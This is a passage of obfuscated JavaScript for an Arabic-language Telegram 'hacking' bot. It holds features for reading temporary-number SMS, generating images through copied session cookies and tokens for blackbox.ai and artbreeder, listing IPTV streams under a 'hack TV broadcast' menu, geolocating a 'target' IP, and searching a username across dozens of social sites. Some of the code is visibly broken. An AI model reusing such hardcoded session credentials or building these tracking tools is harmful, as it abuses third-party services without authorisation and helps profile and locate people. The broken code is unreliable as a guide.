    let نص = "📬 *الرسائل المستلمة:*\n\n";
    رسائل.forEach((رسالة, index) => {
        const وقت_عشوائي = new Date().toLocaleTimeString("ar-EG", {
            hour: "2-digit",
            minute: "2-digit",
            hour12: true
        });
        
        نص += `${index + 1}) *المرسل:* ${رسالة[0]}\n`;
        نص += `   *الرسالة:* ${رسالة[1]}\n`;
        نص += `   *وقت الاستلام:* ${وقت_عشوائي}\n\n`;
    });

    نص += "\n⚠️ _يتم تحديث الرسائل كل دقيقة_";
    return نص;
}

function تنسيق_الرسائل(رسائل) {
    if (!رسائل || رسائل.length === 0) {
        return "❌ لا توجد رسائل جديدة للرقم المحدد.";
    }

    let نص = "📬 *الرسائل المستلمة:*\n\n";
    رسائل.forEach((رسالة, index) => {
        نص += `${index + 1}) *المرسل:* ${رسالة[0]}\n`;
        نص += `   *الرسالة:* ${رسالة[1]}\n\n`;
    });

    return نص;
}

async function ارسال_معلومات_الرقم(message, معلومات) {
    try {
        if (!معلومات) {
            throw new Error("لم يتم العثور على معلومات الرقم");
        }

        const نص = `
🔔 *تم إنشاء رقم جديد*
📱 *الرقم:* \`${معلومات.رقم}\`
🌍 *الدولة:* ${معلومات.اسم_الدولة} ${معلومات.علم_الدولة}
🔰 *رمز الدولة:* ${معلومات.رمز_الدولة}
📅 *التاريخ:* ${معلومات.تاريخ_الإنشاء}
⏰ *الوقت:* ${معلومات.وقت_الإنشاء}

_اضغط على الرقم لنسخه_`;

        await bot.sendMessage(message.chat.id, نص, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 تغيير الرقم", callback_data:"aa" }],
                    [{ text: "💬 طلب الكود", callback_data:`ff${معلومات.رقم}` }]
                ]
            }
        });
    } catch (error) {
        console.error("خطأ في إرسال معلومات الرقم:", error);
        await bot.sendMessage(message.chat.id, "❌ حدث خطأ أثناء إنشاء الرقم. الرجاء المحاولة مرة أخرى.");
    }
}

async function تحديث_معلومات_الرقم(message, معلومات) {
    try {
        if (!معلومات) {
            throw new Error("لم يتم العثور على معلومات الرقم الجديد");
        }

        await bot.editMessageText(`
🔔 *تم تحديث الرقم*
📱 *الرقم:* \`${معلومات.رقم}\`
🌍 *الدولة:* ${معلومات.اسم_الدولة} ${معلومات.علم_الدولة}
🔰 *رمز الدولة:* ${معلومات.رمز_الدولة}
📅 *التاريخ:* ${معلومات.تاريخ_الإنشاء}
⏰ *الوقت:* ${معلومات.وقت_الإنشاء}

_اضغط على الرقم لنسخه_`, {
            chat_id: message.chat.id,
            message_id: message.message_id,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 تغيير الرقم", callback_data:"aa" }],
                    [{ text: "💬 طلب الكود", callback_data:`ff${معلومات.رقم}` }]
                ]
            }
        });
    } catch (error) {
        console.error("خطأ في تحديث معلومات الرقم:", error);
        await bot.sendMessage(message.chat.id, "❌ حدث خطأ أثناء تحديث الرقم. الرجاء المحاولة مرة أخرى.");
    }
}

bot.on('callback_query', async (query) => {
    try {
        const chatId = query.message.chat.id;

        if (query.data === "SS") {
            const معلومات = await الحصول_على_معلومات_رقم_عشوائي();
            await ارسال_معلومات_الرقم(query.message, معلومات);
        } 
        else if (query.data.startsWith("ff")) {
            const رقم = query.data.split("_")[2];
            const رسالة_انتظار = await bot.sendMessage(chatId, "🔍 جاري البحث عن الرسائل...");
            
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            const رسائل = await استخراج_الرسائل_من_الموقع(رقم);
            const نص_منسق = تنسيق_الرسائل(رسائل);
            
            await bot.deleteMessage(chatId, رسالة_انتظار.message_id);
            
            await bot.sendMessage(chatId, نص_منسق, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "🔄 تحديث الرسائل", callback_data: `ff${رقم}` }]
                    ]
                }
            });
        } 
        else if (query.data === "aa") {
            const معلومات = await الحصول_على_معلومات_رقم_عشوائي();
            await تحديث_معلومات_الرقم(query.message, معلومات);
        }
        else {
            
        }
    } catch (error) {
        console.error("خطأ في معالجة الأزرار:", error);
        await bot.sendMessage(query.message.chat.id, "❌ حدث خطأ. الرجاء المحاولة مرة أخرى.");
    }
});

const COOKIE_DATA = {
  'sessionId': "e4912ddb-37a8-41f7-a7cd-3eea84311f59",
  'intercom-id-jlmqxicb': "edb9d414-54c5-4ee8-993c-4a323e392702",
  'intercom-session-jlmqxicb': '',
  'intercom-device-id-jlmqxicb': "929fc9ae-8528-4e2e-abab-4386870a9d91",
  '__Host-authjs.csrf-token': "71222d927b265a6f2719f96f108e5d328a2b2547eeaa534554d06cd9273e1cc3%7C943802a534e0e8f26f24f03a84fb7f79ac161e5564e676620e5eb39af7c94f7a",
  '__Secure-authjs.callback-url': "https%3A%2F%2Fwww.blackbox.ai"
};
const REQUEST_HEADERS = {
  'authority': "www.blackbox.ai",
  'accept': "*/*",
  'accept-language': "ar,en-US;q=0.9,en;q=0.8",
  'content-type': "application/json",
  'origin': "https://www.blackbox.ai",
  'referer': "https://www.blackbox.ai/agent/ImageGenerationLV45LJp",
  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
  'sec-ch-ua-mobile': '?1',
  'sec-ch-ua-platform': "\"Android\"",
  'sec-fetch-dest': "empty",
  'sec-fetch-mode': "cors",
  'sec-fetch-site': "same-origin",
  'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
};
async function generateImageRequest(_0x522e64) {
  const _0xbcdd21 = {
    'messages': [{
      'id': "ukAuPrckvMPeX2huaoqwd",
      'content': _0x522e64,
      'role': "user"
    }],
    'id': "ukAuPrckvMPeX2huaoqwd",
    'previewToken': null,
    'userId': null,
    'codeModelMode': true,
    'agentMode': {
      'mode': true,
      'id': "ImageGenerationLV45LJp",
      'name': "Image Generation"
    },
    'trendingAgentMode': {},
    'isMicMode': false,
    'maxTokens': 0x400,
    'playgroundTopP': null,
    'playgroundTemperature': null,
    'isChromeExt': false,
    'githubToken': null,
    'clickedAnswer2': false,
    'clickedAnswer3': false,
    'clickedForceWebSearch': false,
    'visitFromDelta': false,
    'mobileClient': false,
    'userSelectedModel': "Gemini-Pro"
  };
  try {
    const _0x27fea3 = await axios.post("https://www.blackbox.ai/api/chat", _0xbcdd21, {
      'headers': REQUEST_HEADERS,
      'withCredentials': true
    });
    return _0x27fea3.data;
  } catch (_0x315b03) {
    console.error("Error generating image:", _0x315b03);
    return null;
  }
}
function extractImageUrl(_0x3943d7) {
  const _0x223b27 = _0x3943d7.indexOf("https://");
  if (_0x223b27 !== -1) {
    const _0x27dc5b = _0x3943d7.indexOf(".jpg", _0x223b27) + 4;
    return _0x3943d7.slice(_0x223b27, _0x27dc5b);
  }
  return null;
}
const userLastRequestTime = {};
const userRequestFlag = {};
function getRemainingTime(_0x534470) {
  if (_0x534470 in userLastRequestTime) {
    const _0x2f98f7 = Date.now() - userLastRequestTime[_0x534470];
    const _0x2db9ed = Math.max(0, 900000 - _0x2f98f7);
    const _0x2c19e5 = Math.floor(_0x2db9ed / 60000);
    const _0x574e00 = Math.floor(_0x2db9ed % 60000 / 1000);
    return _0x2c19e5 + " دقيقة و " + _0x574e00 + " ثانية";
  }
  return "لا يوجد طلب سابق.";
}
bot.onText(/\/stghiarㅗt/, _0x3a908c => {
  const _0x117e2e = _0x3a908c.chat.id;
  const _0x5b39e3 = {
    'inline_keyboard': [[{
      'text': "الذكاء الاصطناعي",
      'callback_data': 'ai'
    }]]
  };
  bot.sendMessage(_0x117e2e, "مرحباً! اختر أحد الخيارات أدناه:", {
    'reply_markup': _0x5b39e3
  });
});
bot.on("callback_query", async _0x59baa9 => {
  const _0x348e04 = _0x59baa9.message.chat.id;
  const _0x492c4e = _0x59baa9.data;
  if (_0x492c4e === 'ai') {
    const _0x455f15 = {
      'inline_keyboard': [[{
        'text': "سيفر 1 ✨",
        'callback_data': "generate_image"
      }, {
        'text': "سيفر 2 ✨",
        'callback_data': "generate_imageee"
      }]]
    };
    await bot.editMessageText("اختر ما تريد القيام به:", {
      'chat_id': _0x348e04,
      'message_id': _0x59baa9.message.message_id,
      'reply_markup': _0x455f15
    });
  } else {
    if (_0x492c4e === "generate_image") {
      const _0x5c3a7a = Date.now();
      if (_0x348e04 in userLastRequestTime && _0x5c3a7a - userLastRequestTime[_0x348e04] < 900000) {
        const _0x529cc5 = getRemainingTime(_0x348e04);
        await bot.sendMessage(_0x348e04, "يمكنك توليد صورة مرة واحدة فقط كل 15 دقيقة. المتبقي: " + _0x529cc5 + '.');
      } else {
        userLastRequestTime[_0x348e04] = _0x5c3a7a;
        userRequestFlag[_0x348e04] = true;
        await bot.sendMessage(_0x348e04, "يرجى إرسال النص بالإنجليزية لتوليد الصورة.");
      }
    }
  }
});
bot.on("message", async _0x140c51 => {
  const _0x172b49 = _0x140c51.chat.id;
  const _0x5980c2 = _0x140c51.text;
  if (!userRequestFlag[_0x172b49]) {
    await bot.sendMessage(_0x172b49, '');
    return;
  }
  if (!/^[A-Za-z0-9\s.,!?-]+$/.test(_0x5980c2)) {
    await bot.sendMessage(_0x172b49, "❌ النص يجب أن يكون باللغة الإنجليزية فقط.");
    return;
  }
  const _0x3d50f0 = await bot.sendMessage(_0x172b49, '✨');
  const _0x2703db = await generateImageRequest(_0x5980c2);
  const _0x4e9117 = extractImageUrl(_0x2703db);
  if (_0x4e9117) {
    const _0xafbf6b = await axios.get(_0x4e9117, {
      'responseType': "arraybuffer"
    });
    const _0x358df0 = Buffer.from(_0xafbf6b.data, "binary");
    await bot.sendPhoto(_0x172b49, _0x358df0);
    await bot.deleteMessage(_0x172b49, _0x3d50f0.message_id);
    userRequestFlag[_0x172b49] = false;
  } else {
    await bot.sendMessage(_0x172b49, "لم يتم العثور على صورة.");
    await bot.deleteMessage(_0x172b49, _0x3d50f0.message_id);
  }
});
let user_last_req_HZ1 = {};
let user_req_flag_xT9 = {};
async function img_gen_req_9uH(_0xca0363) {
  const _0x1a99b1 = {
    'authority': "www.artbreeder.com",
    'accept': "application/json",
    'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    'content-type': "application/json",
    'cookie': "_ga=GA1.1.1431068565.1728589613; connect.sid=s%3ANHUd5hmOYL3i4_8m4ZExzzHVhxvqpPxo.sJ%2FAHhf2v8kogOYUlfYdwYsy7tJCb0KaMlMCWMS%2Ff7U; _ga_0YSSRMY0WW=GS1.1.1728589612.1.1.1728590146.0.0.0",
    'origin': "https://www.artbreeder.com",
    'referer': "https://www.artbreeder.com/create/composer",
    'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': "\"Android\"",
    'sec-fetch-dest': "empty",
    'sec-fetch-mode': "cors",
    'sec-fetch-site': "same-origin",
    'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
  };
  const _0x3af2eb = {
    'job': {
      'name': "multi-ipa-light",
      'data': {
        'seed': 0x0,
        'prompt': _0xca0363,
        'guidance_scale': 0x1,
        'width': 0x400,
        'height': 0x400,
        'num_inference_steps': 0x4,
        'init_image': null,
        'init_image_strength': 0.2,
        'scribble_guidance_scale': 0x0,
        'scribble_guidance_image': null,
        'model_name': "sdxl-lightning",
        'return_binary': true,
        'image_format': "jpeg",
        'ipa_data': [],
        'negative_prompt': '',
        'do_upres': false,
        'do_upscale': false
      },
      'alias': "composer-image"
    },
    'environment': null,
    'browserToken': "BUCh4hE2VWbZaOv1SayP"
  };
  const _0x51282a = await fetch("https://www.artbreeder.com/api/realTimeJobs", {
    'method': "POST",
    'headersgg': _0x1a99b1,
    'body': JSON.stringify(_0x3af2eb)
  });
  if (_0x51282a.status === 200) {
    return _0x51282a.buffer();
  }
  return null;
}
function rem_time_uL4(_0x43f284) {
  if (user_last_req_HZ1[_0x43f284]) {
    const _0x767f95 = Date.now() - user_last_req_HZ1[_0x43f284];
    const _0x17ef9c = Math.max(0, 900000 - _0x767f95);
    const _0x9a7b4 = Math.floor(_0x17ef9c / 60000);
    const _0xaa5337 = Math.floor(_0x17ef9c % 60000 / 1000);
    return _0x9a7b4 + " دقيقة و " + _0xaa5337 + " ثانية";
  }
  return "لا يوجد طلب سابق.";
}
bot.onText(/\/sta노잽ㅍrt/, _0x378fc2 => {
  const _0x6ff2a2 = _0x378fc2.chat.id;
  const _0x260818 = {
    'reply_markup': {
      'inline_keyboard': [[{
        'text': "الذكاء الاصطناعي",
        'callback_data': "aiii"
      }]]
    }
  };
  bot.sendMessage(_0x6ff2a2, "مرحباً! اختر أحد الخيارات أدناه:", _0x260818);
});
bot.on("callback_query", _0x1fe5cc => {
  const _0x54ced8 = _0x1fe5cc.message.chat.id;
  const _0x3db456 = _0x1fe5cc.data;
  if (_0x3db456 === "aiii") {
    const _0x3826a9 = {
      'reply_markup': {
        'inline_keyboard': [[{
          'text': "توليد صور",
          'callback_data': "generate_imageee"
        }]]
      }
    };
    bot.editMessageText("اختر ما تريد القيام به:", {
      'chat_id': _0x54ced8,
      'message_id': _0x1fe5cc.message.message_id,
      ..._0x3826a9
    });
  } else {
    if (_0x3db456 === "generate_imageee") {
      const _0xea1061 = Date.now();
      if (user_last_req_HZ1[_0x54ced8] && _0xea1061 - user_last_req_HZ1[_0x54ced8] < 900000) {
        const _0x299b35 = rem_time_uL4(_0x54ced8);
        bot.sendMessage(_0x54ced8, "يمكنك توليد صورة مرة واحدة فقط كل 15 دقيقة. المتبقي: " + _0x299b35 + '.');
      } else {
        user_last_req_HZ1[_0x54ced8] = _0xea1061;
        user_req_flag_xT9[_0x54ced8] = true;
        bot.sendMessage(_0x54ced8, "يرجى إرسال النص بالإنجليزية لتوليد الصورة.");
      }
    }
  }
});
bot.on("message", async _0x235495 => {
  const _0x566235 = _0x235495.chat.id;
  const _0x7cfdd8 = _0x235495.text;
  if (!user_req_flag_xT9[_0x566235]) {
    return bot.sendMessage(_0x566235, '');
  }
  if (!/^[\x00-\x7F]*$/.test(_0x7cfdd8)) {
    return bot.sendMessage(_0x566235, "❌ النص يجب أن يكون باللغة الإنجليزية فقط.");
  }
  const _0x367d61 = await bot.sendMessage(_0x566235, '✨');
  const _0x41cde7 = await img_gen_req_9uH(_0x7cfdd8);
  if (_0x41cde7) {
    const _0x1c849d = Readable.from(_0x41cde7);
    await bot.sendPhoto(_0x566235, _0x1c849d);
    bot.deleteMessage(_0x566235, _0x367d61.message_id);
    user_req_flag_xT9[_0x566235] = false;
  } else {
    bot.sendMessage(_0x566235, "لم يتم العثور على صورة.");
    bot.deleteMessage(_0x566235, _0x367d61.message_id);
  }
});


const countriesMap = {                            
  "الإمارات 🇦🇪": "AE",                       
  "السعودية 🇸🇦": "SA",
  "اليمن 👑🇾🇪": "YE",
  "مصر 🇪🇬": "EG",
  "الأردن 🇯🇴": "JO",
  "قطر 🇶🇦": "QA",
  "البحرين 🇧🇭": "BH",
  "الكويت 🇰🇼": "KW",
  "عمان 🇴🇲": "OM",
  "لبنان 🇱🇧": "LB",
  "سوريا 🇸🇾": "SY",
  "العراق 🇮🇶": "IQ",
  "السودان 🇸🇩": "SD",
  "المغرب 🇲🇦": "MA",
  "تونس 🇹🇳": "TN",
  "الجزائر 🇩🇿": "DZ",
  "ليبيا 🇱🇾": "LY",
  "فلسطين 🇵🇸": "PS",
  "موريتانيا 🇲🇷": "MR",
  "الصومال 🇸🇴": "SO",
  "جيبوتي 🇩🇯": "DJ",
  "جزر القمر 🇰🇲": "KM",
  "تركيا 🇹🇷": "TR",
  "إيران 🇮🇷": "IR",
  "أفغانستان 🇦🇫": "AF",
  "الأرجنتين 🇦🇷": "AR",
  "أرمينيا 🇦🇲": "AM",
  "أستراليا 🇦🇺": "AU",
  "النمسا 🇦🇹": "AT",
  "أذربيجان 🇦🇿": "AZ",
  "بيلاروس 🇧🇾": "BY",
  "بلجيكا 🇧🇪": "BE",
  "بنغلاديش 🇧🇩": "BD",
  "بليز 🇧🇿": "BZ",
  "بنين 🇧🇯": "BJ",
  "بوليفيا 🇧🇴": "BO",
  "البوسنة والهرسك 🇧🇦": "BA",
  "بوتسوانا 🇧🇼": "BW",
  "البرازيل 🇧🇷": "BR",
  "بلغاريا 🇧🇬": "BG",
  "بوركينا فاسو 🇧🇫": "BF",
  "كمبوديا 🇰🇭": "KH",
  "الكاميرون 🇨🇲": "CM",
  "كندا 🇨🇦": "CA",
  "تشيلي 🇨🇱": "CL",
  "الصين 🇨🇳": "CN",
  "كولومبيا 🇨🇴": "CO",
  "كوستاريكا 🇨🇷": "CR",
  "كرواتيا 🇭🇷": "HR",
  "كوبا 🇨🇺": "CU",
  "قبرص 🇨🇾": "CY",
  "التشيك 🇨🇿": "CZ",
  "الدنمارك 🇩🇰": "DK",
  "الإكوادور 🇪🇨": "EC",
  "إستونيا 🇪🇪": "EE",
  "فنلندا 🇫🇮": "FI",
  "فرنسا 🇫🇷": "FR",
  "ألمانيا 🇩🇪": "DE",
  "غانا 🇬🇭": "GH",
  "اليونان 🇬🇷": "GR",
  "غواتيمالا 🇬🇹": "GT",
  "هندوراس 🇭🇳": "HN",
  "المجر 🇭🇺": "HU",
  "آيسلندا 🇮🇸": "IS",
  "الهند 🇮🇳": "IN",
  "إندونيسيا 🇮🇩": "ID",
  "إسرائيل 🇮🇱": "IL",
  "إيطاليا 🇮🇹": "IT",
  "ساحل العاج 🇨🇮": "CI",
  "جامايكا 🇯🇲": "JM",
  "اليابان 🇯🇵": "JP",
  "كازاخستان 🇰🇿": "KZ",
  "كينيا 🇰🇪": "KE",
  "كوريا الجنوبية 🇰🇷": "KR",
  "كوريا الشمالية 🇰🇵": "KP",
  "كوسوفو 🇽🇰": "XK",
  "لاوس 🇱🇦": "LA",
  "لاتفيا 🇱🇻": "LV",
  "ليتوانيا 🇱🇹": "LT",
  "لوكسمبورغ 🇱🇺": "LU",
  "مدغشقر 🇲🇬": "MG",
  "ماليزيا 🇲🇾": "MY",
  "مالطا 🇲🇹": "MT",
  "المكسيك 🇲🇽": "MX",
  "مولدوفا 🇲🇩": "MD",
  "موناكو 🇲🇨": "MC",
  "منغوليا 🇲🇳": "MN",
  "الجبل الأسود 🇲🇪": "ME",
  "نيبال 🇳🇵": "NP",
  "هولندا 🇳🇱": "NL",
  "نيوزيلندا 🇳🇿": "NZ",
  "نيكاراغوا 🇳🇮": "NI",
  "نيجيريا 🇳🇬": "NG",
  "النرويج 🇳🇴": "NO",
  "باكستان 🇵🇰": "PK",
  "بنما 🇵🇦": "PA",
  "باراغواي 🇵🇾": "PY",
  "بيرو 🇵🇪": "PE",
  "الفلبين 🇵🇭": "PH",
  "بولندا 🇵🇱": "PL",
  "البرتغال 🇵🇹": "PT",
  "رومانيا 🇷🇴": "RO",
  "روسيا 🇷🇺": "RU",
  "رواندا 🇷🇼": "RW",
  "السنغال 🇸🇳": "SN",
  "صربيا 🇷🇸": "RS",
  "سنغافورة 🇸🇬": "SG",
  "سلوفاكيا 🇸🇰": "SK",
  "سلوفينيا 🇸🇮": "SI",
  "جنوب أفريقيا 🇿🇦": "ZA",
  "إسبانيا 🇪🇸": "ES",
  "سريلانكا 🇱🇰": "LK",
  "السويد 🇸🇪": "SE",
  "سويسرا 🇨🇭": "CH",
  "تنزانيا 🇹🇿": "TZ",
  "تايلاند 🇹🇭": "TH",
  "ترينيداد وتوباغو 🇹🇹": "TT",
  "أوغندا 🇺🇬": "UG",
  "أوكرانيا 🇺🇦": "UA",
  "المملكة المتحدة 🇬🇧": "GB",
  "الولايات المتحدة 🇺🇸": "US",
  "أوروغواي 🇺🇾": "UY",
  "أوزبكستان 🇺🇿": "UZ",
  "فنزويلا 🇻🇪": "VE",
  "فيتنام 🇻🇳": "VN",
  "زامبيا 🇿🇲": "ZM",
  "زيمبابوي 🇿🇼": "ZW",
  "أنتيغوا وبربودا 🇦🇬": "AG",
  "سانت كيتس ونيفيس 🇰🇳": "KN",
  "دومينيكا 🇩🇲": "DM",
  "سانت لوسيا 🇱🇨": "LC",
  "غرينادا 🇬🇩": "GD",
  "الباهاماس 🇧🇸": "BS",
  "باربادوس 🇧🇧": "BB",
  "سانت فنسنت والغرينادين 🇻🇨": "VC",
  "هايتي 🇭🇹": "HT",
  "كوبا 🇨🇺": "CU",
  "غيانا 🇬🇾": "GY",
  "سورينام 🇸🇷": "SR",
  "الفاتيكان 🇻🇦": "VA",
  "أندورا 🇦🇩": "AD",
  "سان مارينو 🇸🇲": "SM",
  "ليختنشتاين 🇱🇮": "LI",
  "المالديف 🇲🇻": "MV",
  "فيجي 🇫🇯": "FJ",
  "بابوا غينيا الجديدة 🇵🇬": "PG",
  "ساموا 🇼🇸": "WS",
  "تونغا 🇹🇴": "TO",
  "فانواتو 🇻🇺": "VU",
  "بالاو 🇵🇼": "PW",
  "ميكرونيزيا 🇫🇲": "FM",
  "جزر مارشال 🇲🇭": "MH",
  "توفالو 🇹🇻": "TV"
};

async function getTVChannels(countryCode) {
  try {
 
    const channelsResponse = await axios.get('https://iptv-org.github.io/api/channels.json');
    const channels = channelsResponse.data;

    const countryChannels = channels.filter(channel => channel.country === countryCode);

    if (countryChannels.length === 0) {
      return [];
    }

    const streamsResponse = await axios.get('https://iptv-org.github.io/api/streams.json');
    const streams = streamsResponse.data;

    const validChannels = countryChannels.map(channel => {
      const stream = streams.find(s => s.channel === channel.id);
      return {
        name_en: channel.name,
        name_ar: channel.alt_names && channel.alt_names.length > 0 ? channel.alt_names[0] : "غير متوفر",
        url: stream ? stream.url : "لا يوجد رابط بث"
      };
    });

    return validChannels.filter(channel => channel.url !== "لا يوجد رابط بث");
  } catch (error) {
    console.error('خطأ في جلب القنوات أو روابط البث:', error);
    return [];
  }
}

function showTVCountryList(chatId, startIndex = 0) {
  const buttons = [];
  const countryNames = Object.keys(countriesMap);

  const endIndex = Math.min(startIndex + 70, countryNames.length);

  for (let i = startIndex; i < endIndex; i += 3) {
    const row = [];
    for (let j = i; j < i + 3 && j < endIndex; j++) {
      const name = countryNames[j];
      row.push({ text: name, callback_data: `tv_country_${countriesMap[name]}` });  // تعديل هنا
    }
    buttons.push(row);
  }

  const navigationButtons = [];
  if (startIndex > 0) {
    navigationButtons.push({ text: "العودة", callback_data: `back_${startIndex - 70}` });
  }
  if (endIndex < countryNames.length) {
    navigationButtons.push({ text: "المتابعة", callback_data: `continue_${endIndex}` });
  }

  if (navigationButtons.length) {
    buttons.push(navigationButtons);
  }

  bot.sendMessage(chatId, "اختر الدولة لاختراق بث التلفزيون:", {
    reply_markup: {
      inline_keyboard: buttons
    }
  });
}

function sendMessagesInChunksWithIntro(chatId, messages, introMessage, chunkSize = 10) {
  let index = 0;

  function sendNextChunk() {
    if (index === 0) {
      const firstChunk = messages.slice(index, index + chunkSize).join('\n\n');
      bot.sendMessage(chatId, `${introMessage}\n\n${firstChunk}`).then(() => {
        index += chunkSize;
        if (index < messages.length) {
          sendNextChunk();
        }
      });
    } else {
      const chunk = messages.slice(index, index + chunkSize).join('\n\n');
      bot.sendMessage(chatId, chunk).then(() => {
        index += chunkSize;
        if (index < messages.length) {
          sendNextChunk();
        }
      });
    }
  }

  sendNextChunk();
}

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'tv_channels') {
    showTVCountryList(chatId); 
  } else if (query.data.startsWith('tv_country_')) {
    const countryCode = query.data.split('_')[2];
    const arabicNameWithFlag = Object.keys(countriesMap).find(name => countriesMap[name] === countryCode);

    
    const channels = await getTVChannels(countryCode);
    
    if (channels && channels.length > 0) {
      const messages = channels.map((channel) => 
        `اسم القناة (EN): ${channel.name_en}\nاسم القناة (AR): ${channel.name_ar}\nرابط البث: ${channel.url}`
      );

 
      const introMessage = `قنوات التلفزيون المتاحة في ${arabicNameWithFlag}:\n\n`;


      sendMessagesInChunksWithIntro(chatId, messages, introMessage);
    } else {
      bot.sendMessage(chatId, `عذرًا، لم نتمكن من العثور على قنوات تلفزيونية لـ ${arabicNameWithFlag}.`);
    }
  } else if (query.data.startsWith('continue_')) {
    const nextIndex = parseInt(query.data.split('_')[1], 10);
    showTVCountryList(chatId, nextIndex);
  } else if (query.data.startsWith('back_')) {
    const prevIndex = parseInt(query.data.split('_')[1], 10);
    showTVCountryList(chatId, prevIndex);
  }
});

bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const userId = message.chat.id;
    const data = callbackQuery.data;

    if (!allUsers[userId]) {
        allUsers[userId] = {}; 
    }

    if (data === "ip_tracker") {
        bot.sendMessage(userId, "🎭 | أدخل عنوان IP: ");
        allUsers[userId].awaitingIP = true;
        allUsers[userId].awaitingUsername = false;  
    } else if (data === "username_tracker") {
        bot.sendMessage(userId, "🎉 | أدخل اسم المستخدم: لايتم البحث عنه في جميع المواقع المسجلة بنفس الاسم ");
        allUsers[userId].awaitingIP = false;  
        allUsers[userId].awaitingUsername = true;
    }
});


bot.on('message', (msg) => {
    const userId = msg.chat.id;

    if (allUsers[userId] && allUsers[userId].awaitingIP) {
        IP_Track(msg);
        allUsers[userId].awaitingIP = false;  
    } else if (allUsers[userId] && allUsers[userId].awaitingUsername) {
        TrackLu(msg);
        allUsers[userId].awaitingUsername = false;  
    }
});

async function IP_Track(message) {
    try {
        const response = await axios.get(`http://ipwho.is/${message.text}`);
        const ip_data = response.data;

       
        const borders = ip_data.borders || 'غير متوفر';
        const flag = ip_data.flag ? ip_data.flag.emoji : 'غير متوفر';

        const responseText = `
⚡ | معلومات IP
• 〈 عنوان IP المستهدف 〉 : ${ip_data.ip || 'غير متوفر'}
• 〈 نوع IP 〉 : ${ip_data.type || 'غير متوفر'}
• 〈 الدولة 〉 : ${ip_data.country || 'غير متوفر'}
• 〈 رمز الدولة 〉 : ${ip_data.country_code || 'غير متوفر'}
• 〈 العلم 〉 : ${flag}
• 〈 المدينة 〉 : ${ip_data.city || 'غير متوفر'}
• 〈 القارة 〉 : ${ip_data.continent || 'غير متوفر'}
• 〈 رمز القارة 〉 : ${ip_data.continent_code || 'غير متوفر'}
• 〈 المنطقة 〉 : ${ip_data.region || 'غير متوفر'}
• 〈 رمز المنطقة 〉 : ${ip_data.region_code || 'غير متوفر'}
• 〈 خط العرض 〉 : ${ip_data.latitude || 'غير متوفر'}
• 〈 خط الطول 〉 : ${ip_data.longitude || 'غير متوفر'}
• 〈 النطاق 〉 : ${(ip_data.connection && ip_data.connection.domain) || 'غير متوفر'}
• 〈 الخريطة 〉 : [اضغط هنا](https://www.google.com/maps/@${ip_data.latitude},${ip_data.longitude},10z)
• 〈 مزود خدمة الإنترنت 〉 : ${(ip_data.connection && ip_data.connection.isp) || 'غير متوفر'}
• 〈 ASN 〉 : ${(ip_data.connection && ip_data.connection.asn) || 'غير متوفر'}
• 〈 المنطقة الزمنية 〉 : ${(ip_data.timezone && ip_data.timezone.id) || 'غير متوفر'}
• 〈 التوقيت الصيفي 〉 : ${ip_data.timezone && ip_data.timezone.is_dst ? 'نعم' : 'لا'}
• 〈 UTC 〉 : ${(ip_data.timezone && ip_data.timezone.utc) || 'غير متوفر'}
• 〈 المنظمة 〉 : ${(ip_data.connection && ip_data.connection.org) || 'غير متوفر'}
• 〈 الوقت الحالي 〉 : ${(ip_data.timezone && ip_data.timezone.current_time) || 'غير متوفر'}
• 〈 الحدود 〉 : ${borders}
• 〈 العاصمة 〉 : ${ip_data.capital || 'غير متوفر'}
• 〈 كود الاتصال 〉 : ${ip_data.calling_code || 'غير متوفر'}
• 〈 البريد 〉 : ${ip_data.postal || 'غير متوفر'}
• 〈 الاتحاد الأوروبي 〉 : ${ip_data.is_eu ? 'نعم' : 'لا'}
`;
        bot.sendMessage(message.chat.id, responseText, { parse_mode: 'Markdown' });
    } catch (error) {
        bot.sendMessage(message.chat.id, `حدث خطأ: ${error.message}`);
    }
}



  async function TrackLu(message) {
    try {
        const username = message.text;
        const social_media = [
            { url: "https://www.facebook.com/{}", name: "فيسبوك" },
            { url: "https://www.twitter.com/{}", name: "تويتر" },
            { url: "https://www.instagram.com/{}", name: "انستغرام" },
            { url: "https://www.linkedin.com/in/{}", name: "لينكد إن" },
            { url: "https://www.github.com/{}", name: "جيت هب" },
            { url: "https://www.pinterest.com/{}", name: "بينتيريست" },
            { url: "https://www.youtube.com/{}", name: "يوتيوب" },
            { url: "https://www.tiktok.com/@{}", name: "تيك توك" },
            { url: "https://t.me/{}", name: "تيليجرام" },
            { url: "https://www.tumblr.com/{}", name: "تمبلر" },
            { url: "https://soundcloud.com/{}", name: "ساوند كلاود" },
            { url: "https://www.snapchat.com/add/{}", name: "سناب شات" },
            { url: "https://www.behance.net/{}", name: "بيهانس" },
            { url: "https://medium.com/@{}", name: "ميديوم" },
            { url: "https://www.quora.com/profile/{}", name: "كورا" },
            { url: "https://www.flickr.com/people/{}", name: "فليكر" },
            { url: "https://www.twitch.tv/{}", name: "تويتش" },
            { url: "https://dribbble.com/{}", name: "دريبل" },
            { url: "https://vk.com/{}", name: "في كي" },
            { url: "https://about.me/{}", name: "أباوت مي" },
            { url: "https://imgur.com/user/{}", name: "إمغور" },
            { url: "https://www.producthunt.com/@{}", name: "برودكت هانت" },
            { url: "https://mastodon.social/@{}", name: "ماستودون" },
            { url: "https://www.last.fm/user/{}", name: "لاست إف إم" },
            { url: "https://www.goodreads.com/{}", name: "غودريدز" },
            { url: "https://500px.com/{}", name: "500بكس" },
            { url: "https://www.etsy.com/shop/{}", name: "إتسي" },
            { url: "https://www.patreon.com/{}", name: "باتريون" },
            { url: "https://www.mixcloud.com/{}", name: "ميكس كلاود" },
